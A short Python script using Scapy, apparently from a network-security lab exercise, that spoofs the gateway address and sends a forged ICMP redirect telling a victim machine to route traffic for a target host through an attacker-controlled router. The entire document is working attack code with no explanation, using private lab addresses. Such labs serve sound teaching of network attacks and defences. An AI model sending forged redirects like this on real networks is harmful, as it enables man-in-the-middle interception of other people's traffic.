from scapy.all import *

MR_IP = '10.9.0.111'
V_IP = '10.9.0.5'
AK_IP = '10.9.0.105'
NE_IP = '10.9.0.123'
VM_IP = '10.0.2.4'
GW = '10.9.0.11'
H1_IP = '192.168.60.5'
H2_IP = '192.168.60.6'

ip = IP(src=GW, dst=VM_IP)
icmp1 = ICMP(type=5, code=1) # type=5 is redirect, code=1 is for host
icmp1.gw = MR_IP
iprd = IP(src=VM_IP, dst=H1_IP)
data = iprd/ICMP()
pkt = ip/icmp1/data

send(pkt)